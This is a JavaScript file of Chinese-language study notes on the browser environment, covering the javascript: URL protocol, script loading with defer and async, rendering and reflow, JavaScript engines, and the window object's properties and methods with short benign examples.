// URL 支持javascript:协议，即在 URL 的位置写入代码，使用这个 URL 的时候
// 就会执行 JavaScript 代码。
{/* <a href="javascript:console.log('Hello')">点击</a> */}
// 浏览器的地址栏也可以执行javascript:协议。将javascript:console.log('Hello')
// 放入地址栏，按回车键也会执行这段代码。
// 如果 JavaScript 代码返回一个字符串，浏览器就会新建一个文档，展示这个字符串
// 的内容，原有文档的内容都会消失。
{/* <a href="javascript: new Date().toLocaleTimeString();">点击</a> */}
// 上面代码中，用户点击链接以后，会打开一个新文档，里面有当前时间。
// 如果返回的不是字符串，那么浏览器不会新建文档，也不会跳转。
{/* <a href="javascript: console.log(new Date().toLocaleTimeString())">点击</a> */}
// 上面代码中，用户点击链接后，网页不会跳转，只会在控制台显示当前时间。
// javascript:协议的常见用途是书签脚本 Bookmarklet。由于浏览器的书签保存的
// 是一个网址，所以javascript:网址也可以保存在里面，用户选择这个书签的时候，
// 就会在当前页面执行这个脚本。为了防止书签替换掉当前文档，可以在脚本前加上void，
// 或者在脚本最后加上void 0。
{/* <a href="javascript: void new Date().toLocaleTimeString();">点击</a>
<a href="javascript: new Date().toLocaleTimeString();void 0;">点击</a> */}
// 上面这两种写法，点击链接后，执行代码都不会网页跳转。
// script 元素 
// 工作原理 
// 浏览器加载 JavaScript 脚本，主要通过<script>元素完成。正常的网页加载流程是这样的。
// 浏览器一边下载 HTML 网页，一边开始解析。也就是说，不等到下载完，就开始解析。
// 解析过程中，浏览器发现<script>元素，就暂停解析，把网页渲染的控制权
// 转交给 JavaScript 引擎。
// 如果<script>元素引用了外部脚本，就下载该脚本再执行，否则就直接执行代码。
// JavaScript 引擎执行完毕，控制权交还渲染引擎，恢复往下解析 HTML 网页。
// 加载外部脚本时，浏览器会暂停页面渲染，等待脚本下载并执行完成后，再继续渲染。
// 原因是 JavaScript 代码可以修改 DOM，所以必须把控制权让给它，否则会导致复杂的
// 线程竞赛的问题。
// 如果外部脚本加载时间很长（一直无法完成下载），那么浏览器就会一直等待脚本
// 下载完成，造成网页长时间失去响应，浏览器就会呈现“假死”状态，这被称为“阻塞效应”。
// 为了避免这种情况，较好的做法是将<script>标签都放在页面底部，而不是头部。
// 这样即使遇到脚本失去响应，网页主体的渲染也已经完成了，用户至少可以看到内容，
// 而不是面对一张空白的页面。如果某些脚本代码非常重要，一定要放在页面头部的话，
// 最好直接将代码写入页面，而不是连接外部脚本文件，这样能缩短加载时间。
// 脚本文件都放在网页尾部加载，还有一个好处。因为在 DOM 结构生成之前就调用 DOM 节点，
// JavaScript 会报错，如果脚本都在网页尾部加载，就不存在这个问题，因为这时 DOM 
// 肯定已经生成了。
{/* <head>
  <script>
    console.log(document.body.innerHTML);
  </script>
</head>
<body>
</body> */}
// 上面代码执行时会报错，因为此时document.body元素还未生成。
// 一种解决方法是设定DOMContentLoaded事件的回调函数。
{/* <head>
  <script>
    document.addEventListener(
      'DOMContentLoaded',
      function (event) {
        console.log(document.body.innerHTML);
      }
    );
  </script>
</head> */}
// 上面代码中，指定DOMContentLoaded事件发生后，才开始执行相关代码。
// DOMContentLoaded事件只有在 DOM 结构生成之后才会触发。
// 另一种解决方法是，使用<script>标签的onload属性。当<script>标签指定的
// 外部脚本文件下载和解析完成，会触发一个load事件，可以把所需执行的代码，
// 放在这个事件的回调函数里面。
{/* <script src="jquery.min.js" onload="console.log(document.body.innerHTML)">
</script> */}
// 但是，如果将脚本放在页面底部，就可以完全按照正常的方式写，上面两种方式都不需要。
{/* <body>
  <!-- 其他代码  -->
  <script>
    console.log(document.body.innerHTML);
  </script>
</body> */}
// 如果有多个script标签，比如下面这样。
{/* <script src="a.js"></script>
<script src="b.js"></script> */}
// 浏览器会同时并行下载a.js和b.js，但是，执行时会保证先执行a.js，
// 然后再执行b.js，即使后者先下载完成，也是如此。也就是说，脚本的执行顺序
// 由它们在页面中的出现顺序决定，这是为了保证脚本之间的依赖关系不受到破坏。
// 当然，加载这两个脚本都会产生“阻塞效应”，必须等到它们都加载完成，
// 浏览器才会继续页面渲染。
// 解析和执行 CSS，也会产生阻塞。Firefox 浏览器会等到脚本前面的所有样式表，
// 都下载并解析完，再执行脚本；Webkit则是一旦发现脚本引用了样式，就会暂停
// 执行脚本，等到样式表下载并解析完，再恢复执行。
// 此外，对于来自同一个域名的资源，比如脚本文件、样式表文件、图片文件等，
// 浏览器一般有限制，同时最多下载6～20个资源，即最多同时打开的 TCP 连接有限制，
// 这是为了防止对服务器造成太大压力。如果是来自不同域名的资源，就没有这个限制。
// 所以，通常把静态文件放在不同的域名之下，以加快下载速度。
// defer 属性
// 为了解决脚本文件下载阻塞网页渲染的问题，一个方法是对<script>元素加入defer属性。
// 它的作用是延迟脚本的执行，等到 DOM 加载生成后，再执行脚本。
{/* <script src="a.js" defer></script>
<script src="b.js" defer></script> */}
// 上面代码中，只有等到 DOM 加载完成后，才会执行a.js和b.js。
// defer属性的运行流程如下。
// 浏览器开始解析 HTML 网页。
// 解析过程中，发现带有defer属性的<script>元素。
// 浏览器继续往下解析 HTML 网页，同时并行下载<script>元素加载的外部脚本。
// 浏览器完成解析 HTML 网页，此时再回过头执行已经下载完成的脚本。
// 有了defer属性，浏览器下载脚本文件的时候，不会阻塞页面渲染。下载的
// 脚本文件在DOMContentLoaded事件触发前执行（即刚刚读取完</html>标签），
// 而且可以保证执行顺序就是它们在页面上出现的顺序。
// 对于内置而不是加载外部脚本的script标签，以及动态生成的script标签，defer属性
// 不起作用。另外，使用defer加载的外部脚本不应该使用document.write方法。
// async 属性 
// 解决“阻塞效应”的另一个方法是对<script>元素加入async属性。
{/* <script src="a.js" async></script>
<script src="b.js" async></script> */}
// async属性的作用是，使用另一个进程下载脚本，下载时不会阻塞渲染。
// 浏览器开始解析 HTML 网页。
// 解析过程中，发现带有async属性的script标签。
// 浏览器继续往下解析 HTML 网页，同时并行下载<script>标签中的外部脚本。
// 脚本下载完成，浏览器暂停解析 HTML 网页，开始执行下载的脚本。
// 脚本执行完毕，浏览器恢复解析 HTML 网页。
// async属性可以保证脚本下载的同时，浏览器继续渲染。需要注意的是，一旦采用这个属性，
// 就无法保证脚本的执行顺序。哪个脚本先下载结束，就先执行那个脚本。
// 另外，使用async属性的脚本文件里面的代码，不应该使用document.write方法。
// defer属性和async属性到底应该使用哪一个？
// 一般来说，如果脚本之间没有依赖关系，就使用async属性，如果脚本之间有依赖关系，
// 就使用defer属性。如果同时使用async和defer属性，后者不起作用，
// 浏览器行为由async属性决定。
// 脚本的动态加载
//script>元素还可以动态生成，生成后再插入页面，从而实现脚本的动态加载。
['a.js', 'b.js'].forEach(function(src) {
  var script = document.createElement('script');
  script.src = src;
  document.head.appendChild(script);
});
// 这种方法的好处是，动态生成的script标签不会阻塞页面渲染，也就不会造成
// 浏览器假死。但是问题在于，这种方法无法保证脚本的执行顺序，哪个脚本文件
// 先下载完成，就先执行哪个。
// 如果想避免这个问题，可以设置async属性为false。
['a.js', 'b.js'].forEach(function(src) {
  var script = document.createElement('script');
  script.src = src;
  script.async = false;
  document.head.appendChild(script);
});
// 上面的代码不会阻塞页面渲染，而且可以保证b.js在a.js后面执行。
// 不过需要注意的是，在这段代码后面加载的脚本文件，会因此都等待b.js执行完成后再执行。
// 如果想为动态加载的脚本指定回调函数，可以使用下面的写法。
function loadScript(src, done) {
  var js = document.createElement('script');
  js.src = src;
  js.onload = function() {
    done();
  };
  js.onerror = function() {
    done(new Error('Failed to load script ' + src));
  };
  document.head.appendChild(js);
}
// 加载使用的协议
// 如果不指定协议，浏览器默认采用 HTTP 协议下载。
{/* <script src="example.js"></script> */}
// 上面的example.js默认就是采用 HTTP 协议下载，如果要采用 HTTPS 协议下载，必需写明。
{/* <script src="https://example.js"></script> */}
// 但是有时我们会希望，根据页面本身的协议来决定加载协议，这时可以采用下面的写法。
{/* <script src="//example.js"></script> */}
// 浏览器的组成
// 浏览器的核心是两部分：渲染引擎和 JavaScript 解释器（又称 JavaScript 引擎）
// 渲染引擎
// 渲染引擎的主要作用是，将网页代码渲染为用户视觉可以感知的平面文档。
// 不同的浏览器有不同的渲染引擎。
// Firefox：Gecko 引擎
// Safari：WebKit 引擎
// Chrome：Blink 引擎
// IE: Trident 引擎
// Edge: EdgeHTML 引擎
// 渲染引擎处理网页，通常分成四个阶段。
// 解析代码：HTML 代码解析为 DOM，CSS 代码解析为 CSSOM（CSS Object Model）。
// 对象合成：将 DOM 和 CSSOM 合成一棵渲染树（render tree）。
// 布局：计算出渲染树的布局（layout）。
// 绘制：将渲染树绘制到屏幕。
// 以上四步并非严格按顺序执行，往往第一步还没完成，第二步和第三步就已经开始了。
// 所以，会看到这种情况：网页的 HTML 代码还没下载完，但浏览器已经显示出内容了。
// 重流和重绘
// 渲染树转换为网页布局，称为“布局流”（flow）；布局显示到页面的这个过程，
// 称为“绘制”（paint）。它们都具有阻塞效应，并且会耗费很多时间和计算资源。
// 页面生成以后，脚本操作和样式表操作，都会触发“重流”（reflow）和“重绘”（repaint）。
// 用户的互动也会触发重流和重绘，比如设置了鼠标悬停（a:hover）效果、页面滚动、
// 在输入框中输入文本、改变窗口大小等等。
// 重流和重绘并不一定一起发生，重流必然导致重绘，重绘不一定需要重流。
// 比如改变元素颜色，只会导致重绘，而不会导致重流；改变元素的布局，则会导致重绘和重流。
// 大多数情况下，浏览器会智能判断，将重流和重绘只限制到相关的子树上面，
// 最小化所耗费的代价，而不会全局重新生成网页。
// 作为开发者，应该尽量设法降低重绘的次数和成本。比如，尽量不要变动高层的 DOM 元素，
// 而以底层 DOM 元素的变动代替；再比如，重绘table布局和flex布局，开销都会比较大。
var foo = document.getElementById('foobar');
foo.style.color = 'blue';
foo.style.marginTop = '30px';
// 上面的代码只会导致一次重绘，因为浏览器会累积 DOM 变动，然后一次性执行。
// 下面是一些优化技巧。
// 读取 DOM 或者写入 DOM，尽量写在一起，不要混杂。不要读取一个 DOM 节点，
// 然后立刻写入，接着再读取一个 DOM 节点。
// 缓存 DOM 信息。
// 不要一项一项地改变样式，而是使用 CSS class 一次性改变样式。
// 使用documentFragment操作 DOM
// 动画使用absolute定位或fixed定位，这样可以减少对其他元素的影响。
// 只在必要时才显示隐藏元素。
// 使用window.requestAnimationFrame()，因为它可以把代码推迟到下一次重流时执行，
// 而不是立即要求页面重流。
// 使用虚拟 DOM（virtual DOM）库。
// 下面是一个window.requestAnimationFrame()对比效果的例子。
// 重绘代价高
function doubleHeight(element) {
  var currentHeight = element.clientHeight;
  element.style.height = (currentHeight * 2) + 'px';
}
all_my_elements.forEach(doubleHeight);
// 重绘代价低
function doubleHeight(element) {
  var currentHeight = element.clientHeight;
  window.requestAnimationFrame(function () {
    element.style.height = (currentHeight * 2) + 'px';
  });
}
all_my_elements.forEach(doubleHeight);
// 上面的第一段代码，每读一次 DOM，就写入新的值，会造成不停的重排和重流。
// 第二段代码把所有的写操作，都累积在一起，从而 DOM 代码变动的代价就最小化了。
// JavaScript 引擎 
// JavaScript 引擎的主要作用是，读取网页中的 JavaScript 代码，对其处理后运行。
// JavaScript 是一种解释型语言，也就是说，它不需要编译，由解释器实时运行。
// 这样的好处是运行和修改都比较方便，刷新页面就可以重新解释；缺点是每次运行
// 都要调用解释器，系统开销较大，运行速度慢于编译型语言。
// 为了提高运行速度，目前的浏览器都将 JavaScript 进行一定程度的编译，
// 生成类似字节码（bytecode）的中间代码，以提高运行速度。
// 早期，浏览器内部对 JavaScript 的处理过程如下：
// 读取代码，进行词法分析（Lexical analysis），将代码分解成词元（token）。
// 对词元进行语法分析（parsing），将代码整理成“语法树”（syntax tree）。
// 使用“翻译器”（translator），将代码转为字节码（bytecode）。
// 使用“字节码解释器”（bytecode interpreter），将字节码转为机器码。
// 逐行解释将字节码转为机器码，是很低效的。为了提高运行速度，现代浏览器改为
// 采用“即时编译”（Just In Time compiler，缩写 JIT），即字节码只在运行时编译，
// 用到哪一行就编译哪一行，并且把编译结果缓存（inline cache）。通常，一个程序
// 被经常用到的，只是其中一小部分代码，有了缓存的编译结果，整个程序的运行速度就会显著提升。
// 字节码不能直接运行，而是运行在一个虚拟机（Virtual Machine）之上，一般也把虚拟机
// 称为 JavaScript 引擎。并非所有的 JavaScript 虚拟机运行时都有字节码，
// 有的 JavaScript 虚拟机基于源码，即只要有可能，就通过 JIT（just in time）编译器
// 直接把源码编译成机器码运行，省略字节码步骤。这一点与其他采用虚拟机（比如 Java）的
// 语言不尽相同。这样做的目的，是为了尽可能地优化代码、提高性能。下面是目前最常见的
// 一些 JavaScript 虚拟机：
// Chakra (Microsoft Internet Explorer)
// Nitro/JavaScript Core (Safari)
// Carakan (Opera)
// SpiderMonkey (Firefox)
// V8 (Chrome, Chromium)
// window 对象
// 概述
// 浏览器里面，window对象（注意，w为小写）指当前的浏览器窗口。它也是当前页面
// 的顶层对象，即最高一层的对象，所有其他对象都是它的下属。一个变量如果未声明，
// 那么默认就是顶层对象的属性。
a = 1
window.a // 1
// 上面代码中，a是一个没有声明就直接赋值的变量，它自动成为顶层对象的属性。
// window有自己的实体含义，其实不适合当作最高一层的顶层对象，这是一个语言的设计失误。
// 最早，设计这门语言的时候，原始设想是语言内置的对象越少越好，这样可以提高浏览器
// 的性能。因此，语言设计者 Brendan Eich 就把window对象当作顶层对象，所有未声明
// 就赋值的变量都自动变成window对象的属性。这种设计使得编译阶段无法检测出未声明变量，
// 但到了今天已经没有办法纠正了。
// // window 对象的属性
// window.name
// window.name属性是一个字符串，表示当前浏览器窗口的名字。窗口不一定需要名字，
// 这个属性主要配合超链接和表单的target属性使用。
window.name = 'Hello World!';
console.log(window.name) // "Hello World!"
// 该属性只能保存字符串，如果写入的值不是字符串，会自动转成字符串。各个浏览器
// 对这个值的储存容量有所不同，但是一般来说，可以高达几MB。
// 只要浏览器窗口不关闭，这个属性是不会消失的。举例来说，访问a.com时，该页面的脚本
// 设置了window.name，接下来在同一个窗口里面载入了b.com，新页面的脚本可以读到
// 上一个网页设置的window.name。页面刷新也是这种情况。一旦浏览器窗口关闭后，
// 该属性保存的值就会消失，因为这时窗口已经不存在了。
// window.closed，window.opener
// window.closed属性返回一个布尔值，表示窗口是否关闭。
window.closed // false
// 上面代码检查当前窗口是否关闭。这种检查意义不大，因为只要能运行代码，当前窗口
// 肯定没有关闭。这个属性一般用来检查，使用脚本打开的新窗口是否关闭。
var popup = window.open();
if ((popup !== null) && !popup.closed) {
  // 窗口仍然打开着
}
// window.opener属性表示打开当前窗口的父窗口。如果当前窗口没有父窗口
// （即直接在地址栏输入打开），则返回null。
window.open().opener === window // true
// 上面表达式会打开一个新窗口，然后返回true。
// 如果两个窗口之间不需要通信，建议将子窗口的opener属性显式设为null，这样可以
// 减少一些安全隐患。
var newWin = window.open('example.html', 'newWindow', 'height=400,width=400');
newWin.opener = null;
// 上面代码中，子窗口的opener属性设为null，两个窗口之间就没办法再联系了。
// 通过opener属性，可以获得父窗口的全局属性和方法，但只限于两个窗口同源的
// 情况（参见《同源限制》一章），且其中一个窗口由另一个打开。
// <a>元素添加rel="noopener"属性，可以防止新打开的窗口获取父窗口，
// 减轻被恶意网站修改父窗口 URL 的风险。
{/* <a href="https://an.evil.site" target="_blank" rel="noopener">
恶意网站
</a> */}
// window.self，window.window
// window.self和window.window属性都指向窗口本身。这两个属性只读。
window.self === window // true
window.window === window // true
// window.frames，window.length
// window.frames属性返回一个类似数组的对象，成员为页面内所有框架窗口，
// 包括frame元素和iframe元素。window.frames[0]表示页面中第一个框架窗口。
// 如果iframe元素设置了id或name属性，那么就可以用属性值，引用这个iframe窗口。
// 比如<iframe name="myIFrame">可以用frames['myIFrame']或者frames.myIFrame来引用。
// frames属性实际上是window对象的别名。
frames === window // true
// 因此，frames[0]也可以用window[0]表示。但是，从语义上看，frames更清晰，而且
// 考虑到window还是全局对象，因此推荐表示多窗口时，总是使用frames[0]的写法。
// 更多介绍请看下文的《多窗口操作》部分。
// window.length属性返回当前网页包含的框架总数。如果当前网页不包含frame和iframe元素，
// 那么window.length就返回0。
window.frames.length === window.length // true
// 上面代码表示，window.frames.length与window.length应该是相等的。
// window.frameElement
// window.frameElement属性主要用于当前窗口嵌在另一个网页的情况
// （嵌入<object>、<iframe>或<embed>元素），返回当前窗口所在的那个元素节点。
// 如果当前窗口是顶层窗口，或者所嵌入的那个网页不是同源的，该属性返回null。
// HTML 代码如下
// <iframe src="about.html"></iframe>
// 下面的脚本在 about.html 里面
var frameEl = window.frameElement;
if (frameEl) {
  frameEl.src = 'other.html';
}
// 上面代码中，frameEl变量就是<iframe>元素。
// window.top，window.parent
// window.top属性指向最顶层窗口，主要用于在框架窗口（frame）里面获取顶层窗口。
// window.parent属性指向父窗口。如果当前窗口没有父窗口，window.parent指向自身。
if (window.parent !== window.top) {
  // 表明当前窗口嵌入不止一层
}
// 对于不包含框架的网页，这两个属性等同于window对象
// window.status
// window.status属性用于读写浏览器状态栏的文本。
// 但是，现在很多浏览器都不允许改写状态栏文本，所以使用这个方法不一定有效
// window.devicePixelRatio
// window.devicePixelRatio属性返回一个数值，表示一个 CSS 像素的大小与一个物理像素
// 的大小之间的比率。也就是说，它表示一个 CSS 像素由多少个物理像素组成。
// 它可以用于判断用户的显示环境，如果这个比率较大，就表示用户正在使用高清屏幕，
// 因此可以显示较大像素的图片。
// 位置大小属性
// 以下属性返回window对象的位置信息和大小信息
// （1）window.screenX，window.screenY
// window.screenX和window.screenY属性，返回浏览器窗口左上角相对于当前屏幕左上角
// 的水平距离和垂直距离（单位像素）。这两个属性只读。
// （2） window.innerHeight，window.innerWidth
// window.innerHeight和window.innerWidth属性，返回网页在当前窗口中
// 可见部分的高度和宽度，即“视口”（viewport）的大小（单位像素）。这两个属性只读。
// 用户放大网页的时候（比如将网页从100%的大小放大为200%），这两个属性会变小。
// 因为这时网页的像素大小不变（比如宽度还是960像素），只是每个像素占据的屏幕空间变大了，
// 因为可见部分（视口）就变小了。
// 注意，这两个属性值包括滚动条的高度和宽度。
// （3）window.outerHeight，window.outerWidth
// window.outerHeight和window.outerWidth属性返回浏览器窗口的高度和宽度，
// 包括浏览器菜单和边框（单位像素）。这两个属性只读。
// （4）window.scrollX，window.scrollY
// window.scrollX属性返回页面的水平滚动距离，window.scrollY属性返回页面的
// 垂直滚动距离，单位都为像素。这两个属性只读。
// 注意，这两个属性的返回值不是整数，而是双精度浮点数。如果页面没有滚动，它们的值就是0。
// 举例来说，如果用户向下拉动了垂直滚动条75像素，那么window.scrollY就是75左右。
// 用户水平向右拉动水平滚动条200像素，window.scrollX就是200左右。
if (window.scrollY < 75) {
  window.scroll(0, 75);
}
// 上面代码中，如果页面向下滚动的距离小于75像素，那么页面向下滚动75像素。
// （5）window.pageXOffset，window.pageYOffset
// window.pageXOffset属性和window.pageYOffset属性，
// 是window.scrollX和window.scrollY别名。
// 组件属性
// 组件属性返回浏览器的组件对象。这样的属性有下面几个。
// window.locationbar：地址栏对象
// window.menubar：菜单栏对象
// window.scrollbars：窗口的滚动条对象
// window.toolbar：工具栏对象
// window.statusbar：状态栏对象
// window.personalbar：用户安装的个人工具栏对象
// 这些对象的visible属性是一个布尔值，表示这些组件是否可见。这些属性只读。
window.locationbar.visible
window.menubar.visible
window.scrollbars.visible
window.toolbar.visible
window.statusbar.visible
window.personalbar.visible
// 全局对象属性
// 全局对象属性指向一些浏览器原生的全局对象。
// window.document：指向document对象，详见《document 对象》一章。注意，
// 这个属性有同源限制。只有来自同源的脚本才能读取这个属性。
// window.location：指向Location对象，用于获取当前窗口的 URL 信息。
// 它等同于document.location属性，详见《Location 对象》一章。
// window.navigator：指向Navigator对象，用于获取环境信息，详见《Navigator 对象》一章。
// window.history：指向History对象，表示浏览器的浏览历史，详见《History 对象》一章。
// window.localStorage：指向本地储存的 localStorage 数据，详见《Storage 接口》一章。
// window.sessionStorage：指向本地储存的 sessionStorage 数据，详见《Storage 接口》一章。
// window.console：指向console对象，用于操作控制台，详见《console 对象》一章。
// window.screen：指向Screen对象，表示屏幕信息，详见《Screen 对象》一章。
// window.isSecureContext
// window.isSecureContext属性返回一个布尔值，表示当前窗口是否处在加密环境。
// 如果是 HTTPS 协议，就是true，否则就是false。
// window 对象的方法
// window.alert()，window.prompt()，window.confirm()
// window.alert()、window.prompt()、window.confirm()都是浏览器与用户互动的全局方法。
// 它们会弹出不同的对话框，要求用户做出回应。注意，这三个方法弹出的对话框，
// 都是浏览器统一规定的式样，无法定制。
// （1）window.alert()
// window.alert()方法弹出的对话框，只有一个“确定”按钮，往往用来通知用户某些信息。
window.alert('Hello World');
// 用户只有点击“确定”按钮，对话框才会消失。对话框弹出期间，浏览器窗口处于冻结状态，
// 如果不点“确定”按钮，用户什么也干不了。
// window.alert()方法的参数只能是字符串，没法使用 CSS 样式，但是可以用\n指定换行。
alert('本条提示\n分成两行');
// （2）window.prompt()
// window.prompt()方法弹出的对话框，提示文字的下方，还有一个输入框，要求用户输入信息，
// 并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据。
var result = prompt('您的年龄？', 25)
// 上面代码会跳出一个对话框，文字提示为“您的年龄？”，要求用户在对话框中
// 输入自己的年龄（默认显示25）。用户填入的值，会作为返回值存入变量result。
// window.prompt()的返回值有两种情况，可能是字符串（有可能是空字符串），
// 也有可能是null。具体分成三种情况。
// 用户输入信息，并点击“确定”，则用户输入的信息就是返回值。
// 用户没有输入信息，直接点击“确定”，则输入框的默认值就是返回值。
// 用户点击了“取消”（或者按了 ESC 按钮），则返回值是null。
// window.prompt()方法的第二个参数是可选的，但是最好总是提供第二个参数，
// 作为输入框的默认值。
// （3）window.confirm()
// window.confirm()方法弹出的对话框，除了提示信息之外，只有“确定”和“取消”两个按钮，
// 往往用来征询用户是否同意。
var result = confirm('你最近好吗？');
// 上面代码弹出一个对话框，上面只有一行文字“你最近好吗？”，用户选择点击“确定”或“取消”。
// confirm方法返回一个布尔值，如果用户点击“确定”，返回true；如果用户点击“取消”，
// 则返回false。
var okay = confirm('Please confirm this message.');
if (okay) {
  // 用户按下“确定”
} else {
  // 用户按下“取消”
}
// confirm的一个用途是，用户离开当前页面时，弹出一个对话框，问用户是否真的要离开。
window.onunload = function () {
  return window.confirm('你确定要离开当面页面吗？');
}
// 这三个方法都具有堵塞效应，一旦弹出对话框，整个页面就是暂停执行，等待用户做出反应。
// window.open(), window.close()，window.stop()
// （1）window.open()
// window.open方法用于新建另一个浏览器窗口，类似于浏览器菜单的新建窗口选项。
// 它会返回新窗口的引用，如果无法新建窗口，则返回null。
var popup = window.open('somefile.html');
// 上面代码会让浏览器弹出一个新建窗口，网址是当前域名下的somefile.html。
// open方法一共可以接受三个参数。
window.open(url, windowName, [windowFeatures])
// url：字符串，表示新窗口的网址。如果省略，默认网址就是about:blank。
// windowName：字符串，表示新窗口的名字。如果该名字的窗口已经存在，则占用该窗口，
// 不再新建窗口。如果省略，就默认使用_blank，表示新建一个没有名字的窗口。
// 另外还有几个预设值，_self表示当前窗口，_top表示顶层窗口，_parent表示上一层窗口。
// windowFeatures：字符串，内容为逗号分隔的键值对（详见下文），表示新窗口的参数，
// 比如有没有提示栏、工具条等等。如果省略，则默认打开一个完整 UI 的新窗口。
// 如果新建的是一个已经存在的窗口，则该参数不起作用，浏览器沿用以前窗口的参数。
// 下面是一个例子。
var popup = window.open(
  'somepage.html',
  'DefinitionsWindows',
  'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
);
// 上面代码表示，打开的新窗口高度和宽度都为200像素，没有地址栏，
// 但有状态栏和滚动条，允许用户调整大小。
// 第三个参数可以设定如下属性。
// left：新窗口距离屏幕最左边的距离（单位像素）。注意，新窗口必须是可见的，
// 不能设置在屏幕以外的位置。
// top：新窗口距离屏幕最顶部的距离（单位像素）。
// height：新窗口内容区域的高度（单位像素），不得小于100。
// width：新窗口内容区域的宽度（单位像素），不得小于100。
// outerHeight：整个浏览器窗口的高度（单位像素），不得小于100。
// outerWidth：整个浏览器窗口的宽度（单位像素），不得小于100。
// menubar：是否显示菜单栏。
// toolbar：是否显示工具栏。
// location：是否显示地址栏。
// personalbar：是否显示用户自己安装的工具栏。
// status：是否显示状态栏。
// dependent：是否依赖父窗口。如果依赖，那么父窗口最小化，该窗口也最小化；
// 父窗口关闭，该窗口也关闭。
// minimizable：是否有最小化按钮，前提是dialog=yes。
// noopener：新窗口将与父窗口切断联系，即新窗口的window.opener属性返回null，
// 父窗口的window.open()方法也返回null。
// resizable：新窗口是否可以调节大小。
// scrollbars：是否允许新窗口出现滚动条。
// dialog：新窗口标题栏是否出现最大化、最小化、恢复原始大小的控件。
// titlebar：新窗口是否显示标题栏。
// alwaysRaised：是否显示在所有窗口的顶部。
// alwaysLowered：是否显示在父窗口的底下。
// close：新窗口是否显示关闭按钮。
// 对于那些可以打开和关闭的属性，设为yes或1或不设任何值就表示打开，
// 比如status=yes、status=1、status都会得到同样的结果。如果想设为关闭，
// 不用写no，而是直接省略这个属性即可。也就是说，如果在第三个参数中设置了一部分属性，
// 其他没有被设置的yes/no属性都会被设成no，只有titlebar和关闭按钮
// 除外（它们的值默认为yes）。
// 上面这些属性，属性名与属性值之间用等号连接，属性与属性之间用逗号分隔。
// 'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
// 另外，open()方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意
// 控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口
// 被当前网页打开的情况下，才允许open方法指向该窗口。
// window.open方法返回新窗口的引用。
var windowB = window.open('windowB.html', 'WindowB');
windowB.window.name // "WindowB"
// 注意，如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能获取
// 对方窗口对象的内部属性。
// 下面是另一个例子。
var w = window.open();
console.log('已经打开新窗口');
w.location = 'http://example.com';
// 上面代码先打开一个新窗口，然后在该窗口弹出一个对话框，再将网址导向example.com。
// 由于open这个方法很容易被滥用，许多浏览器默认都不允许脚本自动新建窗口。
// 只允许在用户点击链接或按钮时，脚本做出反应，弹出新窗口。因此，
// 有必要检查一下打开新窗口是否成功。
var popup = window.open();
if (popup === null) {
  // 新建窗口失败
}
// （2）window.close()
// window.close方法用于关闭当前窗口，一般只用来关闭window.open方法新建的窗口。
popup.close()
// 该方法只对顶层窗口有效，iframe框架之中的窗口使用该方法无效。
// （3）window.stop()
// window.stop()方法完全等同于单击浏览器的停止按钮，会停止加载图像、视频等
// 正在或等待加载的对象。
window.stop()
// window.moveTo()，window.moveBy()
// window.moveTo()方法用于移动浏览器窗口到指定位置。它接受两个参数，
// 分别是窗口左上角距离屏幕左上角的水平距离和垂直距离，单位为像素。
window.moveTo(100, 200)
// 上面代码将窗口移动到屏幕(100, 200)的位置。
// window.moveBy方法将窗口移动到一个相对位置。它接受两个参数，
// 分布是窗口左上角向右移动的水平距离和向下移动的垂直距离，单位为像素。
window.moveBy(25, 50)
// 上面代码将窗口向右移动25像素、向下移动50像素。
// 为了防止有人滥用这两个方法，随意移动用户的窗口，目前只有一种情况，
// 浏览器允许用脚本移动窗口：该窗口是用window.open方法新建的，并且
// 它所在的 Tab 页是当前窗口里面唯一的。除此以外的情况，使用上面两个方法都是无效的。
// window.resizeTo()，window.resizeBy()
// window.resizeTo()方法用于缩放窗口到指定大小。

// 它接受两个参数，第一个是缩放后的窗口宽度（outerWidth属性，包含滚动条、标题栏等等），
// 第二个是缩放后的窗口高度（outerHeight属性）。
window.resizeTo(
  window.screen.availWidth / 2,
  window.screen.availHeight / 2
)
// 上面代码将当前窗口缩放到，屏幕可用区域的一半宽度和高度。
// window.resizeBy()方法用于缩放窗口。它与window.resizeTo()的区别是，
// 它按照相对的量缩放，window.resizeTo()需要给出缩放后的绝对大小。
// 它接受两个参数，第一个是水平缩放的量，第二个是垂直缩放的量，单位都是像素。
window.resizeBy(-200, -200)
// 上面的代码将当前窗口的宽度和高度，都缩小200像素。
// window.scrollTo()，window.scroll()，window.scrollBy() 
// window.scrollTo方法用于将文档滚动到指定位置。它接受两个参数，
// 表示滚动后位于窗口左上角的页面坐标。
window.scrollTo(x-coord, y-coord)
// 它也可以接受一个配置对象作为参数。
window.scrollTo(options)
// 配置对象options有三个属性。
// top：滚动后页面左上角的垂直坐标，即 y 坐标。
// left：滚动后页面左上角的水平坐标，即 x 坐标。
// behavior：字符串，表示滚动的方式，有三个可能值（smooth、instant、auto），
// 默认值为auto。
window.scrollTo({
  top: 1000,
  behavior: 'smooth'
});
// window.scroll()方法是window.scrollTo()方法的别名。
// window.scrollBy()方法用于将网页滚动指定距离（单位像素）。它接受两个参数：
// 水平向右滚动的像素，垂直向下滚动的像素。
// window.scrollBy(0, window.innerHeight)
// 上面代码用于将网页向下滚动一屏。
// 如果不是要滚动整个文档，而是要滚动某个元素，可以使用下面三个属性和方法。
// Element.scrollTop
// Element.scrollLeft
// Element.scrollIntoView()
// window.print()
// window.print方法会跳出打印对话框，与用户点击菜单里面的“打印”命令效果相同。
// 常见的打印按钮代码如下。
document.getElementById('printLink').onclick = function () {
  window.print();
}
// 非桌面设备（比如手机）可能没有打印功能，这时可以这样判断。
if (typeof window.print === 'function') {
  // 支持打印功能
}
// window.focus()，window.blur()
// window.focus()方法会激活窗口，使其获得焦点，出现在其他窗口的前面。
var popup = window.open('popup.html', 'Popup Window');
if ((popup !== null) && !popup.closed) {
  popup.focus();
}
// 上面代码先检查popup窗口是否依然存在，确认后激活该窗口。
// window.blur()方法将焦点从窗口移除。
// 当前窗口获得焦点时，会触发focus事件；当前窗口失去焦点时，会触发blur事件。
// window.getSelection()
// window.getSelection方法返回一个Selection对象，表示用户现在选中的文本。
var selObj = window.getSelection();
// 使用Selection对象的toString方法可以得到选中的文本。
var selectedText = selObj.toString();
// window.getComputedStyle()，window.matchMedia()
